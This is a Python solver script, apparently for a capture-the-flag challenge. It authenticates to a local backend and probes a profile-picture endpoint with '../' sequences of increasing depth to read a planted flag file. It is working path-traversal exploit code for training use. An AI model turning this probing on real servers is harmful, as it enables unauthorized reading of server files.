#!/usr/bin/env python3
"""
Automated exploit for the Path Traversal via Profile Picture CTF challenge.

Vulnerability: GET /auth/profile-picture?filename=<value>
  The server joins the user-supplied filename directly to the uploads
  directory path with no canonicalization.  Supplying '../' sequences
  allows reading arbitrary server files.

Target file: /tmp/path_traversal_flag.txt  (written on startup)
"""

import argparse
import sys
import requests


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def login(base_url: str, email: str, password: str) -> str:
    """Login and return a JWT access token."""
    resp = requests.post(
        f"{base_url}/auth/login",
        json={"email": email, "password": password},
        timeout=10,
    )
    if resp.status_code != 200:
        print(f"[-] Login failed ({resp.status_code}): {resp.text}")
        sys.exit(1)
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login response did not contain access_token")
        sys.exit(1)
    print(f"[+] Logged in as {email}")
    return token


def fetch_file(base_url: str, token: str, filename: str) -> requests.Response:
    """Send the traversal request."""
    return requests.get(
        f"{base_url}/auth/profile-picture",
        params={"filename": filename},
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

TARGET_FILE = "tmp/path_traversal_flag.txt"


def exploit(base_url: str, token: str) -> str | None:
    """
    Enumerate traversal depth from 3 to 14 until the flag file is reached.
    Returns the flag string on success, None on failure.
    """
    print("[*] Probing traversal depths …")
    for depth in range(3, 15):
        payload = ("../" * depth) + TARGET_FILE
        resp = fetch_file(base_url, token, payload)
        if resp.status_code == 200:
            content = resp.text.strip()
            if content:
                print(f"[+] Traversal succeeded at depth {depth}  (payload: {payload!r})")
                return content
        elif resp.status_code == 404:
            pass  # file not found at this depth — keep trying
        else:
            print(f"[!] Unexpected status {resp.status_code} at depth {depth}: {resp.text[:120]}")

    return None


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Path Traversal exploit — reads /tmp/path_traversal_flag.txt "
                    "via GET /auth/profile-picture?filename=../../…",
    )
    parser.add_argument("--email",    required=True,                        help="Registered user email")
    parser.add_argument("--password", required=True,                        help="User password")
    parser.add_argument("--url",      default="http://localhost:8001",      help="Backend base URL")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")

    token = login(base_url, args.email, args.password)
    flag  = exploit(base_url, token)

    if flag:
        print(f"[+] Flag: {flag}")
        sys.exit(0)
    else:
        print("[-] Exploit failed — could not read the flag file.")
        print("    Make sure the backend is running and flags.yml is configured.")
        sys.exit(1)


if __name__ == "__main__":
    main()
